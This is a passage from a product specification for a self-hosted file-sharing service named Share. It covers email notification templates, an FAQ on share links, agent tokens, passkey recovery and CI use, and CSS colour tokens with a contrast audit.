**`artifact_expiring`** — an artifact with live shares expires in 24 hours

> **Subject:** {name} expires tomorrow and its links will stop working
>
> {name} has an expiry set for {expiry} ({relative}). When it passes, the artifact moves to your
> trash and its {count} live share links stop working. It stays restorable for 30 days.
>
> Keep it and clear the expiry: {keepUrl}
> Change the expiry: {artifactUrl}

---

**`quota_warning`** — 80% or 95% of quota

> **Subject:** Storage is {percent} full
>
> You are using {used} of your {quota} storage limit.
>
> At 100%, posting is refused. Reading, sharing, and deleting keep working, so you can always
> dig out.
>
> What would free space:
>   Trash                          {trashBytes}
>   Not opened in {days} days      {staleBytes}
>   Old versions (estimate)        {versionBytes}
>
> Manage storage: {storageUrl}
>
> These warnings are sent at most once a day.

---

**`token_created`** — an API token was created

> **Subject:** API token created: {tokenName}
>
> A new API token was created on your account.
>
> Name:    {tokenName}
> Prefix:  {displayPrefix}
> Scopes:  {scopes}
> Created: {createdAt} by {actorName}
>
> {This token cannot create share links. / This token CAN create share links, which means it can
> make your artifacts reachable by anyone with a URL.}
>
> If this was not you, revoke it now: {revokeUrl}

---

**`token_first_link`** — a token created its first-ever share link

> **Subject:** {tokenName} created its first share link
>
> The agent token {tokenName} has created a share link for the first time.
>
> Artifact: {name}
> Expires:  {expiry} ({relative})
> Link:     {url}
>
> You are told about this once per token, because the first time an agent puts something within
> reach of the internet is worth noticing.
>
> Revoke this link: {revokeUrl}
> Review this token's scopes: {tokenUrl}

---

**`anomaly_link_rate`** — unusual share-link creation rate

> **Subject:** {tokenName} created {count} share links in an hour
>
> {tokenName} created {count} share links between {from} and {to}. The threshold for this notice
> is 5 an hour, and the hard ceiling is 20.
>
> Artifacts affected: {names}
>
> Nothing was blocked beyond the hourly ceiling.
>
> Revoke every share link on your account: {panicUrl}
> Revoke this token: {revokeTokenUrl}
> See the audit log for this token: {auditUrl}

---

**`anomaly_trash_rate`** — unusual trash rate

> **Subject:** {tokenName} moved {count} artifacts to the trash in an hour
>
> {tokenName} moved {count} artifacts to the trash between {from} and {to}.
>
> Nothing is lost. Trashed artifacts stay restorable for 30 days, and this token cannot delete
> anything permanently.
>
> Review the trash: {trashUrl}
> Revoke this token: {revokeTokenUrl}

---

**`recovery_used`** — a recovery code was used

> **Subject:** A recovery code was used on your account
>
> A recovery code was used to sign in at {time}, from {ip}.
>
> That session can do exactly two things: list your passkeys and register a new one. It ends
> after 30 minutes. Every other recovery code is now invalid, and a new one was issued to
> whoever used it.
>
> If this was you, nothing more is needed.
>
> If it was not, sign in with a passkey and revoke every session and passkey you do not
> recognize: {securityUrl}
>
> This notice cannot be turned off.

---

**`counter_regression`** — passkey signature counter went backwards

> **Subject:** A passkey on your account reported an unexpected use count
>
> The passkey "{passkeyName}" was used at {time} from {ip} and reported a lower use count than
> Share last recorded. That can mean the credential has been copied, and it can also happen with
> some authenticators after a restore.
>
> The sign-in was refused. Nothing was revoked automatically.
>
> Sign in with a different passkey and revoke this one: {securityUrl}
>
> This notice cannot be turned off.

---

**`auth_failures`** — repeated authentication failures from one address

> **Subject:** Repeated failed sign-ins from {ip}
>
> {count} failed authentication attempts came from {ip} in the last hour. Nothing succeeded.
>
> Share has no password to guess and no reset flow to abuse, so this is usually noise from a
> scanner. It is worth a look if the address is one you recognize.
>
> Recent sign-in activity: {securityOverviewUrl}
>
> At most one of these is sent per hour.

---

**`backup_failed`** — instance backup failed (root user)

> **Subject:** Backup failed on share.c52.com
>
> The backup job failed at {time}.
>
> Last successful backup: {lastSuccess} ({relative})
> Error: {shortError}
>
> Artifact bytes on this instance are not backed up anywhere else until this succeeds.
>
> Check the instance status: {statusUrl}
> On the server: `sharectl backup --verbose`

---

**`disk_warning`** — instance disk over 85% (root user)

> **Subject:** Disk is {percent} full on share.c52.com
>
> {free} free of {total}.
>
> At 100% Share refuses new posts with disk_full and keeps serving what is already there.
>
> Largest contributors: trash across all users {trashBytes}, unreferenced files awaiting
> collection {orphanBytes}.
>
> Instance status: {statusUrl}
> On the server: `sharectl collect --now`

---

**`invite`** — an invitation to join the instance

> **Subject:** {inviterName} invited you to Share at share.c52.com
>
> {inviterName} has created an account for you on share.c52.com, a private place where finished
> work gets kept and handed out.
>
> Your handle will be {handle}, and your space will be share.c52.com/~{handle}.
>
> Accept the invite: {inviteUrl}
>
> This link is good until {expiry} ({relative}).
>
> There is no password to choose. You will register a passkey — your device, your phone, or your
> password manager — and get a recovery code to store somewhere safe. Nothing you post is
> reachable by anyone else unless you create a share link for it.

---

**`device_authorization`** — an agent asked for a token

> **Subject:** {agentName} is asking for access to your account
>
> An agent identifying itself as {agentName} started a device authorization at {time} from {ip}.
>
> It is asking for a token that can read and post artifacts in your space. It will not be able to
> create share links.
>
> Approve or deny: {authorizeUrl}
> Code: {userCode}
>
> The request expires in 10 minutes. If this was not you, do nothing — an unapproved request
> issues no token.

---

## 12.10 FAQ

### Getting started

**What is an artifact?**
One finished thing at one address: a PDF, a rendered page, an image, a video, or a bundle of
files that belong together. It has a name, a URL, a version history, one sharing state, and one
entry in the trash if you delete it.

**Do I have to use an agent?**
No. **Upload** in the top bar takes a file or a whole folder, keeps the folder's structure, and
gives you the same artifact an agent would have posted. The CLI works the same way from a
terminal. The MCP endpoint is the path the documentation leads with because it is the one with
nothing to install, not because the others are second class.

**Where does my artifact live?**
At `share.c52.com/{name}` if you are the root user, and `share.c52.com/~{handle}/{name}`
otherwise. That address is stable: post to the same name next week and the URL does not change.

**Why is there no sign-up page?**
Because accounts exist only because the operator created them. If you need an account, ask the
person running the instance to invite you.

### Privacy and sharing

**Is my content encrypted?**
On disk, by full-disk encryption on the server, and in backups, which are encrypted before they
leave the machine. Not application-layer encrypted — the bytes have to be readable by the server
to be served to a browser, so anyone with root on the box or physical access to an unlocked disk
can read them. That is stated plainly rather than buried: the protection against the hosting
provider is disk encryption, and the protection against everyone else is that there is no way in
without a passkey or a link.

**Can someone guess a share link?**
No, in the sense that matters. A share token is 128 bits of randomness from a cryptographic
generator, base58-encoded to 22 characters. There is no listing, no directory, no enumeration
endpoint, and no way to ask whether a token exists other than trying it, which is rate limited.
The realistic risk is not guessing — it is forwarding, which is why every link expires.

**What happens when a link expires?**
Anyone opening it sees one page: "This link is no longer active." No artifact name, no owner, no
date, no reason. Every recipient session on that link is deleted, so someone with the page
already open loses access on their next request. Expired, revoked, burned through a view limit,
and deleted are indistinguishable from outside. Your artifact is untouched — only that one link
ended.

**Can I make a link that never expires?**
No. Not through the dashboard, not through the API, and not through a configuration flag. If
something needs to be readable indefinitely by a specific person who has an account here, grant
it to them instead — grants do not expire and there is no URL to forward.

**Why can't my agent share things?**
Because posting and publishing are different decisions and only one of them should be automatic.
An agent token gets `artifacts:read` and `artifacts:write`, never `share:create`. It can post
and overwrite all day and cannot make any of it reachable from the internet. Asked to share, it
fails with `insufficient_scope`, names the scope, and should hand you a dashboard link. You can
grant `share:create` deliberately if an agent genuinely needs it; you will be emailed every time
it uses it.

**Does Share read my files?**
No. Not for search, not for titles, not for summaries, not for thumbnails, not for classifying,
not for guessing a video's dimensions. There is no code path that opens the contents of an
artifact for any purpose other than serving those exact bytes to someone authorized to receive
them. The cost is that you cannot search inside your files. The benefit is that there is no
extracted index of your clients' numbers sitting anywhere.

**Can the operator see my artifacts?**
The operator has root on the machine, so yes, in the sense that anyone with root on any server
can read what is on it. What they cannot get from the database is who viewed what: view records
hold a salted daily hash that cannot be recomputed after the day rolls over. And there is no API
by which any account, root included, lists or reads inside another user's space.

**Do search engines index this?**
No. Every response carries `X-Robots-Tag: noindex, nofollow`, and `robots.txt` denies everything
with no per-artifact override. An indexed share link would defeat link entropy entirely.

**What can a recipient see about me?**
The hostname. Not your handle, not the artifact's name if you reached them through a share link,
not your email, not how many other artifacts you have, and not whether the link is about to
expire. The password gate, in particular, names nothing at all.

### Posting and organizing

**What happens if I post to a name that already exists?**
You get a new version at the same URL. Title, description, tags, TTL, pinned state, share links,
and grants all survive; only the files change. The previous version stays complete and
restorable, and unchanged files are not re-uploaded.

**What if I delete something an agent needed?**
Deleting moves it to the trash, where it sits for 30 days. During that time its URL returns 404
and the API reports `artifact_not_found`, so an agent will fail rather than get stale content —
restore it and everything works again. What restoring does not bring back is its share links and
grants: trashing revoked them, and undoing a deletion should not silently re-open access. If the
agent needs a specific old version rather than the whole artifact, restore the version instead,
which creates a new version rather than rewinding history.

**Can I get an old version back?**
Yes. Every post keeps the previous version, the default retention is the last 20 or 365 days
(never fewer than 3), and pinned versions are never pruned. Restoring one creates a new version
with the old files, so nothing is lost either way.

**Why can't I search inside my documents?**
Because nothing reads them. Put the words you would search for into the name, title,
description, and tags at the moment you post. Matching is trigram-based, so partial words and
typos still find things.

**Why did my artifact show a file listing instead of my page?**
No file answered at its root. Share looks for the `entryPath` you supplied, then `/index.html`,
then a single HTML file, then a single file of any kind. If none applies you get a listing and a
`no_entry_point` warning. Set an entry file on the Files tab — it takes effect immediately,
without posting again.

**Can I use folders?**
Slashes in names give you the same effect: `q3/market-report` is one artifact whose address has
a slash in it. There are no folder objects to create, move, or delete.

**How much does version history cost me?**
Almost nothing. Identical files are stored once for the whole instance, so twenty versions of a
page whose CSS never changes hold one copy of that CSS. You are charged for what your artifacts
reference, which is why your storage figure will not match a naive sum of file sizes.

### Agents

**How do I connect an agent?**
Create a token, paste one JSON block into your MCP host's configuration, restart it. The
connecting-agents page has ready-made blocks for Claude Code, Cursor, Codex, and generic hosts,
each with this instance's hostname already filled in.

**Can I use this from CI?**
Yes, and it is a documented pattern: put a token in the runner's secret store as `SHARE_TOKEN`,
use `--yes` so a prompt in a non-TTY is an error rather than a guess, and post with
`share post ./out --name preview-$BRANCH --ttl 30d` so every branch gets a stable private URL
that cleans itself up. Do not use `--link` from CI. A pipeline that can create share links is a
pipeline whose compromise creates share links.

**What is the worst a compromised agent token can do?**
Fill your space with junk and fill your trash. It can post, overwrite, and trash, all of which
are reversible: overwrites keep versions, trashing is undoable for 30 days. It cannot delete
permanently without `artifacts:delete`, cannot create a share link without `share:create`, and
cannot touch any space but yours — there is no parameter anywhere in the API that names a
different owner. Every action it takes is audited with its token ID and source address, and
unusual rates raise an email within fifteen minutes.

**Do agents count against my rate limits?**
Yes, per token and per user. The one worth knowing is share-link creation: 20 an hour per user,
which is far above human use and far below what a compromised agent would want. Exhausting it
sends you an email as well as returning 429.

**Can an agent read the artifacts it posted?**
Yes, with `artifacts:read`: `share_read_file` and the files endpoint return contents to a token,
which is also the only way to read the bytes of a password-protected artifact without the
password. Nothing about that involves indexing — a specific file is fetched on request.

### Running it

**What if I lose my passkeys?**
Three layers, in order. A second passkey on another device makes it a non-event, which is why
setup pushes it. Failing that, your recovery code gives you one 30-minute session that can do
exactly one useful thing: register a new passkey. Failing that, the instance is a machine you
control, and `sharectl grant-session --email you@… --minutes 30` on the server prints a one-time
sign-in URL. There is no recovery-by-email-link, because that would reintroduce exactly the
bypass that removing passwords eliminated.

**What happens if I go over quota?**
Posting fails with `quota_exceeded`, returned before any bytes move, with your current,
projected, and limit figures. Reading, downloading, sharing, and deleting keep working. Empty the
trash first — it holds full artifacts and is charged in full.

**Can I add other people?**
The root user can invite them. Each gets their own space, their own quota, and their own tokens.
There are no teams, roles, or shared folders: cross-space access is per-artifact grants and
nothing else.

**What if the server goes down?**
You get a static maintenance page with no timestamp and no auto-refresh. Nothing is lost;
in-flight uploads may need re-running, which is cheap because the files already sent are still
on the server. This is a single-server system by design, and no high availability is claimed.

**Something looks wrong. What do I do first?**
Open the security overview. The first card answers the question that matters — everything of
yours currently reachable without a sign-in, with its expiry. If the answer is wrong, **Revoke
all share links** ends every one of them at once, and revoking the token involved is one click
from the anomaly row.

---

# Part 13 — Design System: Tokens, Type, Components

This part is the visual contract. Part 11 says which screens exist; Part 12 says what words
appear on them; this part says what everything looks like, down to the hex value. Two agents
rendering the same Part 11 screen from these tokens should produce the same screen.

Nothing here is advisory. An implementer who needs a token that does not exist adds it to
`design/tokens.json` (§13.11.2) and records the addition per §1.9 — they do not inline a raw
value.

Screen references use the canonical numbering in `inventory.md`: dashboard screens are 11.1–11.28,
recipient-facing and error pages are R1–R7.

---

## 13.1 Design principles

**D1. Sharing state is the loudest thing on the screen.**
On any surface that represents an artifact, *"who can reach this right now?"* must be legible
in under a second, from across a room, without reading a sentence. The sharing-state indicator
(§13.6.8) is deliberately the most over-specified component in this document because it appears
in at least a dozen places, and any inconsistency between two of them is a privacy bug, not a
polish bug. It owns a colour set, an icon set, a word set, and its own placement rules. Nothing
else may borrow that language: no other badge is teal, no other badge is amber-gold in `solid`,
and no other component uses the lock / users / link-2 triad.

**D2. This is an operator's console, not a marketing site.**
Density is a feature. The default table row is 40px and 32px is one click away. There are no
hero sections, no illustrations, no gradients, no glass, no photography, no decorative icons,
and no animated numbers. Borders are 1px hairlines; shadows exist only to say that something
floats above the page. The reference points are a well-made admin console and a good terminal.
The target is a screen someone can look at for eight hours without it becoming tiring or
shouty.

**D3. The artifact is the content; the chrome must never compete with it.**
Everything in this system exists to frame a rendered PDF, a photograph, a video, or somebody
else's HTML — content whose colours, type, and contrast are not ours and cannot be predicted.
So the shell is monochrome, colour on screen always carries state, and the viewer (§13.5.4)
reduces the chrome to a single 48px bar over a neutral mat. No chrome colour, border, or shadow
may sit within 8px of rendered artifact content, and no dashboard style ever leaks into an
artifact frame — bundles render in an isolated `iframe` with no inherited stylesheet.

**D4. Never colour alone.**
Every state renders as **colour + icon + word**, all three, in that order. Private is a teal
chip with a lock and the word "Private". The word is never dropped to save space; if the space
is not there, the layout is wrong. The one permitted reduction is the `dot` variant of the
sharing-state indicator (§13.6.8.5), which requires an `aria-label`, a tooltip, and the same
fact rendered as text elsewhere in the same row. This rule serves colour-vision deficiency,
greyscale printing, screenshots pasted into a chat window, and a laptop screen in sunlight.

**D5. Widening is a dialog; narrowing is a click.**
A control's interaction weight is proportional to how much it could expose. Creating a share
link takes a dialog, an explicit expiry, a deliberate password choice, and a button that names
the act. Revoking one is a single click with no confirmation — the safe direction is never
obstructed. Destructive-but-not-widening acts (delete an artifact, revoke every token, remove a
user) get the typed-confirmation dialog in §13.6.27. This asymmetry must not be normalised away
in the name of consistency.

**D6. Identifiers are literal.**
Artifact names, share tokens, IDs, hashes, and paths are monospace, selectable, always paired
with a copy control, and never prettified, title-cased, CSS-truncated, or replaced by a friendly
label. Per P5 (§1.6.3) this product never infers anything from a file's contents; the design
system's job is to make the real identifier comfortable to read, not to hide it behind one we
invented.

---

## 13.2 Colour tokens

### 13.2.1 Structure

Three layers, in this order, and no other:

1. **Bare `:root`** carries the complete light palette. Every token is defined here once, with a
   real value. No token gets its only definition inside a media query.
2. **`@media (prefers-color-scheme: dark) { :root:not([data-theme="light"]) { … } }`** redefines
   *only the tokens whose value changes*. The `:not()` guard excludes a viewer who has explicitly
   chosen light.
3. **`:root[data-theme="dark"]`** repeats the same overrides byte-for-byte, so an explicit dark
   choice wins on a light OS. Both dark blocks are generated from one source object (§13.11.2)
   and cannot drift.

`body` always paints `background: var(--bg-canvas)` and `color: var(--text-primary)` explicitly —
never transparent, because a recipient-facing page inherits nothing from us. `<html>` carries
`color-scheme: light dark` so native form controls and scrollbars follow.

### 13.2.2 The three sharing states

These are the three most important colours in the product. §7.8 derives exactly one of them for
every artifact at every moment.

| State | Derived when | Hue | Why this hue |
| --- | --- | --- | --- |
| **Private** | No live links, no live grants | **Teal** | Cool, closed, quiet. The default, and the state that should feel like *nothing is happening*. Deliberately not green — it must never read as "success" or "deployed OK". |
| **Shared with people** | Live grants, no live links | **Indigo-violet** | Cool but populated. A grant is a named human with an account; the colour is calm because there is no bearer token loose in the world, but it is not the same as private, because someone else can see this. |
| **Link active** | At least one live link | **Amber-gold** | Warm, forward, attention-getting. Not red — a live link is not an error, it is a deliberate act by the owner. But it is the state that warrants a second look, so it shares a hue family with `warning`. |

That last sharing is intentional and load-bearing: **amber in Share means "reachable by someone
holding a URL, or otherwise wants your attention."** A warning banner and a link-active badge
being the same family is the semantic, not a collision. Red is reserved for destructive actions
and errors, and never appears on a sharing-state indicator.

Teal / indigo-violet / amber survives protan, deutan, and tritan deficiency because the three
differ in *lightness* and in *warm-versus-cool* as well as in hue: under a deuteranope
simulation the tints read as light-grey-cool, light-blue-cool, and light-warm respectively, and
the foregrounds read as dark-cool, very-dark-cool, and dark-warm. Green-versus-red would not
survive this and is not used for state anywhere in the product. Even so, none of the three is
ever used alone (D4).

### 13.2.3 Modifiers, and the states that are not sharing states

Four further families exist. None of them is a *fourth* sharing state — each is a modifier or a
lifecycle condition rendered as a sibling chip beside the state badge.

| Family | What it marks | Hue | Adjacency rule |
| --- | --- | --- | --- |
| `--state-expiring` | A live link with ≤48h remaining | Orange | Only ever beside the link-active badge |
| `--state-password` | A link that carries a password | Plum | Only ever beside the link-active badge |
| `--state-expired` | A link past its expiry, or an expired-link result page | Slate, dashed border | Replaces the expiry chip; never beside `granted` |
| `--state-trashed` | An artifact in the trash | Warm stone | Replaces the state badge entirely (§13.6.8.4) |

`--state-password` (plum) and `--share-granted` (indigo-violet) are the closest pair in this
palette under protanopia. They are prevented from converging by a hard rule: **the password chip
renders only adjacent to the link-active badge, never adjacent to the granted badge**, so the two
never appear as peers in the same row. The sharing panel (11.12) shows grants and links in
separate sections with their own headings for the same reason.

### 13.2.4 Token definitions

```css
:root {
  /* ---------- Surfaces ---------- */
  --bg-canvas:   #F4F5F7;  /* app background, behind everything */
  --bg-surface:  #FFFFFF;  /* cards, tables, panels, sidebar */
  --bg-raised:   #FFFFFF;  /* menus, dialogs, drawers, popovers (+ shadow) */
  --bg-sunken:   #ECEEF2;  /* code blocks, wells, disabled fields, skeletons */
  --bg-hover:    #F0F2F5;  /* neutral row / menu-item hover */
  --bg-active:   #E4E7ED;  /* pressed, or a held-open trigger */
  --bg-selected: #E8EFFC;  /* selected row, active nav item */
  --bg-overlay:  rgba(15, 19, 26, 0.45);   /* dialog and drawer scrim */
  --bg-viewer:   #E9EBEF;  /* the mat behind a rendered artifact (§13.5.4) */

  /* ---------- Text ---------- */
  --text-primary:   #13171E;  /* body, headings, table cells */
  --text-secondary: #474E5F;  /* labels, secondary cells, sidebar items */
  --text-tertiary:  #646C7C;  /* metadata, table headers, helper text, em dash */
  --text-disabled:  #8A92A2;  /* disabled control text only */
  --text-inverse:   #FFFFFF;  /* on --neutral-solid and on any *-solid fill */
  --text-link:      #1D5FD1;

  /* ---------- Borders ---------- */
  --border-subtle: #E5E7EC;  /* table row rules, section dividers */
  --border-default:#D4D8E0;  /* card and panel edges */
  --border-strong: #7E8697;  /* control boundaries: input, select, checkbox, toggle */
  --border-focus:  #1D5FD1;

  /* ---------- Neutral solid (primary button, tooltip) ---------- */
  --neutral-solid:        #1E2330;
  --neutral-solid-hover:  #2B3241;
  --neutral-solid-active: #0D1117;
  --neutral-solid-text:   #FFFFFF;

  /* ---------- SHARING STATE: private ---------- */
  --share-private-bg:       #E3F2F0;
  --share-private-border:   #A3D4CE;
  --share-private-fg:       #08574F;
  --share-private-solid:    #0A6960;
  --share-private-on-solid: #FFFFFF;

  /* ---------- SHARING STATE: shared with people (grant) ---------- */
  --share-granted-bg:       #ECEBFB;
  --share-granted-border:   #C3BFF0;
  --share-granted-fg:       #3A2E9C;
  --share-granted-solid:    #4A3BC0;
  --share-granted-on-solid: #FFFFFF;

  /* ---------- SHARING STATE: link active ---------- */
  --share-link-bg:       #FCF2DF;
  --share-link-border:   #EED29A;
  --share-link-fg:       #784D05;
  --share-link-solid:    #955F08;
  --share-link-on-solid: #FFFFFF;

  /* ---------- SHARING STATE: unknown (never assume private) ---------- */
  --share-unknown-bg:     #ECEEF2;
  --share-unknown-border: #D4D8E0;
  --share-unknown-fg:     #474E5F;

  /* ---------- Modifier: expiring soon (≤48h) ---------- */
  --state-expiring-bg:       #FDEDE2;
  --state-expiring-border:   #F0C29E;
  --state-expiring-fg:       #883B05;
  --state-expiring-solid:    #A54806;
  --state-expiring-on-solid: #FFFFFF;

  /* ---------- Modifier: password-protected ---------- */
  --state-password-bg:       #F7EAFA;
  --state-password-border:   #DFBCE9;
  --state-password-fg:       #6A2482;
  --state-password-solid:    #7E2C99;
  --state-password-on-solid: #FFFFFF;

  /* ---------- Lifecycle: expired link ---------- */
  --state-expired-bg:     #ECEEF2;
  --state-expired-border: #B9C0CC;   /* rendered 1px dashed */
  --state-expired-fg:     #4A5262;

  /* ---------- Lifecycle: trashed artifact ---------- */
  --state-trashed-bg:     #F1EEEA;
  --state-trashed-border: #D9D2C9;
  --state-trashed-fg:     #57503F;

  /* ---------- Semantic: info ---------- */
  --state-info-bg:       #EAF1FD;
  --state-info-border:   #B9D0F6;
  --state-info-fg:       #14428F;
  --state-info-solid:    #1D5FD1;
  --state-info-on-solid: #FFFFFF;

  /* ---------- Semantic: success ---------- */
  --state-success-bg:       #E6F5EB;
  --state-success-border:   #A7D8BA;
  --state-success-fg:       #0E5A31;
  --state-success-solid:    #14713D;
  --state-success-on-solid: #FFFFFF;

  /* ---------- Semantic: warning (same family as link-active, by design) ---------- */
  --state-warning-bg:       #FCF2DF;
  --state-warning-border:   #EED29A;
  --state-warning-fg:       #784D05;
  --state-warning-solid:    #955F08;
  --state-warning-on-solid: #FFFFFF;

  /* ---------- Semantic: danger ---------- */
  --state-danger-bg:       #FDECEA;
  --state-danger-border:   #F5BFB9;
  --state-danger-fg:       #97231B;
  --state-danger-solid:    #BB2E24;
  --state-danger-hover:    #A6271E;
  --state-danger-on-solid: #FFFFFF;

  /* ---------- Charts (storage, views — 11.25, 11.7) ---------- */
  --chart-1: #1D5FD1;  --chart-2: #0A6960;  --chart-3: #955F08;
  --chart-4: #7E2C99;  --chart-5: #3A2E9C;  --chart-6: #14713D;
  --chart-grid: #E5E7EC;
  --chart-axis: #646C7C;

  /* ---------- Focus ---------- */
  --focus-ring-color:  #1D5FD1;
  --focus-ring-width:  2px;
  --focus-ring-offset: 2px;

  /* ---------- Elevation (light) ---------- */
  --shadow-xs: 0 1px 2px rgba(15, 19, 26, 0.06);
  --shadow-sm: 0 1px 3px rgba(15, 19, 26, 0.08), 0 1px 2px rgba(15, 19, 26, 0.04);
  --shadow-md: 0 4px 12px rgba(15, 19, 26, 0.10), 0 1px 3px rgba(15, 19, 26, 0.06);
  --shadow-lg: 0 16px 40px rgba(15, 19, 26, 0.16), 0 2px 8px rgba(15, 19, 26, 0.08);
}

@media (prefers-color-scheme: dark) {
  :root:not([data-theme="light"]) {
    --bg-canvas:   #0D1015;
    --bg-surface:  #141920;
    --bg-raised:   #1A2029;
    --bg-sunken:   #090C11;
    --bg-hover:    #1D242E;
    --bg-active:   #262F3B;
    --bg-selected: #152848;
    --bg-overlay:  rgba(3, 5, 9, 0.68);
    --bg-viewer:   #090C11;

    --text-primary:   #E8EBF0;
    --text-secondary: #A6AFBE;
    --text-tertiary:  #818B9B;
    --text-disabled:  #5E6878;
    --text-inverse:   #0D1015;
    --text-link:      #77A8F5;

    --border-subtle:  #222A35;
    --border-default: #2E3946;
    --border-strong:  #626E7F;
    --border-focus:   #77A8F5;

    --neutral-solid:        #E8EBF0;
    --neutral-solid-hover:  #FFFFFF;
    --neutral-solid-active: #C8CFD9;
    --neutral-solid-text:   #0D1015;

    --share-private-bg: #0A2523;  --share-private-border: #1A4941;
    --share-private-fg: #5CC9BB;  --share-private-solid:  #29A092;
    --share-private-on-solid: #051F1C;

    --share-granted-bg: #1A1740;  --share-granted-border: #322C6E;
    --share-granted-fg: #ADA5F5;  --share-granted-solid:  #7A6BE0;
    --share-granted-on-solid: #0C0A22;

    --share-link-bg: #2B2008;     --share-link-border: #564019;
    --share-link-fg: #EFB85B;     --share-link-solid:  #D59A2D;
    --share-link-on-solid: #231905;

    --share-unknown-bg: #1D242E;  --share-unknown-border: #2E3946;
    --share-unknown-fg: #A6AFBE;

    --state-expiring-bg: #321909; --state-expiring-border: #5B3016;
    --state-expiring-fg: #F2A16D; --state-expiring-solid:  #DF793B;
    --state-expiring-on-solid: #291105;

    --state-password-bg: #2A1035; --state-password-border: #4C2160;
    --state-password-fg: #DC9BF0; --state-password-solid:  #BC63D6;
    --state-password-on-solid: #1A0620;

    --state-expired-bg: #1D242E;  --state-expired-border: #3A4553;
    --state-expired-fg: #98A2B2;

    --state-trashed-bg: #1F1D19;  --state-trashed-border: #3A362E;
    --state-trashed-fg: #B5AC9A;

    --state-info-bg: #12233F;     --state-info-border: #2A4570;
    --state-info-fg: #8FB8F8;     --state-info-solid:  #3B7DE0;
    --state-info-on-solid: #08111F;

    --state-success-bg: #0E2A1A;  --state-success-border: #205033;
    --state-success-fg: #6DD397;  --state-success-solid:  #35A868;
    --state-success-on-solid: #062012;

    --state-warning-bg: #2B2008;  --state-warning-border: #564019;
    --state-warning-fg: #EFB85B;  --state-warning-solid:  #D59A2D;
    --state-warning-on-solid: #231905;

    --state-danger-bg: #331715;   --state-danger-border: #5E2723;
    --state-danger-fg: #F58F86;   --state-danger-solid:  #E5534B;
    --state-danger-hover: #F26A62;
    --state-danger-on-solid: #2A0C0A;

    --chart-1: #77A8F5;  --chart-2: #5CC9BB;  --chart-3: #EFB85B;
    --chart-4: #DC9BF0;  --chart-5: #ADA5F5;  --chart-6: #6DD397;
    --chart-grid: #222A35;
    --chart-axis: #818B9B;

    --focus-ring-color: #77A8F5;

    --shadow-xs: none;
    --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.40);
    --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.50);
    --shadow-lg: 0 16px 40px rgba(0, 0, 0, 0.60);
  }
}

/* Byte-identical to the media block above, so an explicit dark choice wins on a light OS.
   Both blocks are emitted from one source object by `npm run tokens` (§13.11.2). */
:root[data-theme="dark"] {
  --bg-canvas: #0D1015;  --bg-surface: #141920;  --bg-raised: #1A2029;
  --bg-sunken: #090C11;  --bg-hover:   #1D242E;  --bg-active: #262F3B;
  --bg-selected: #152848; --bg-overlay: rgba(3, 5, 9, 0.68); --bg-viewer: #090C11;

  --text-primary: #E8EBF0;  --text-secondary: #A6AFBE;  --text-tertiary: #818B9B;
  --text-disabled: #5E6878; --text-inverse:   #0D1015;  --text-link:     #77A8F5;

  --border-subtle: #222A35; --border-default: #2E3946;
  --border-strong: #626E7F; --border-focus:   #77A8F5;

  --neutral-solid: #E8EBF0;        --neutral-solid-hover: #FFFFFF;
  --neutral-solid-active: #C8CFD9; --neutral-solid-text:  #0D1015;

  --share-private-bg: #0A2523;  --share-private-border: #1A4941;
  --share-private-fg: #5CC9BB;  --share-private-solid:  #29A092;
  --share-private-on-solid: #051F1C;

  --share-granted-bg: #1A1740;  --share-granted-border: #322C6E;
  --share-granted-fg: #ADA5F5;  --share-granted-solid:  #7A6BE0;
  --share-granted-on-solid: #0C0A22;

  --share-link-bg: #2B2008;     --share-link-border: #564019;
  --share-link-fg: #EFB85B;     --share-link-solid:  #D59A2D;
  --share-link-on-solid: #231905;

  --share-unknown-bg: #1D242E;  --share-unknown-border: #2E3946;
  --share-unknown-fg: #A6AFBE;

  --state-expiring-bg: #321909; --state-expiring-border: #5B3016;
  --state-expiring-fg: #F2A16D; --state-expiring-solid:  #DF793B;
  --state-expiring-on-solid: #291105;

  --state-password-bg: #2A1035; --state-password-border: #4C2160;
  --state-password-fg: #DC9BF0; --state-password-solid:  #BC63D6;
  --state-password-on-solid: #1A0620;

  --state-expired-bg: #1D242E;  --state-expired-border: #3A4553;
  --state-expired-fg: #98A2B2;

  --state-trashed-bg: #1F1D19;  --state-trashed-border: #3A362E;
  --state-trashed-fg: #B5AC9A;

  --state-info-bg: #12233F;     --state-info-border: #2A4570;
  --state-info-fg: #8FB8F8;     --state-info-solid:  #3B7DE0;
  --state-info-on-solid: #08111F;

  --state-success-bg: #0E2A1A;  --state-success-border: #205033;
  --state-success-fg: #6DD397;  --state-success-solid:  #35A868;
  --state-success-on-solid: #062012;

  --state-warning-bg: #2B2008;  --state-warning-border: #564019;
  --state-warning-fg: #EFB85B;  --state-warning-solid:  #D59A2D;
  --state-warning-on-solid: #231905;

  --state-danger-bg: #331715;   --state-danger-border: #5E2723;
  --state-danger-fg: #F58F86;   --state-danger-solid:  #E5534B;
  --state-danger-hover: #F26A62; --state-danger-on-solid: #2A0C0A;

  --chart-1: #77A8F5;  --chart-2: #5CC9BB;  --chart-3: #EFB85B;
  --chart-4: #DC9BF0;  --chart-5: #ADA5F5;  --chart-6: #6DD397;
  --chart-grid: #222A35; --chart-axis: #818B9B;

  --focus-ring-color: #77A8F5;

  --shadow-xs: none;
  --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.40);
  --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.50);
  --shadow-lg: 0 16px 40px rgba(0, 0, 0, 0.60);
}
```

Elevation in dark theme is primarily a background step (`--bg-surface` → `--bg-raised`) plus a
much tighter shadow, because a large soft shadow is invisible on a dark canvas.

### 13.2.5 Contrast audit

Measured with the WCAG 2.1 relative-luminance formula, sRGB, no antialiasing assumptions.
**AA body** = 4.5:1. **AA large** (≥18.66px regular or ≥14px bold) = 3:1. **AA non-text**
(control boundaries, focus rings, meaningful icons, solid state fills) = 3:1.

**Light theme — text**

| Foreground | on `--bg-surface` | on `--bg-canvas` | on `--bg-sunken` | Verdict |
| --- | --- | --- | --- | --- |
| `--text-primary` #13171E | 17.96 | 16.47 | 15.47 | AAA |
| `--text-secondary` #474E5F | 8.32 | 7.63 | 7.17 | AAA |
| `--text-tertiary` #646C7C | 5.28 | 4.84 | 4.54 | **AA body on all three** |
| `--text-link` #1D5FD1 | 5.82 | 5.33 | 5.01 | AA |
| `--text-disabled` #8A92A2 | 3.13 | 2.87 | 2.69 | Exempt (WCAG 1.4.3 disabled-control exception); still ≥3:1 on surface |

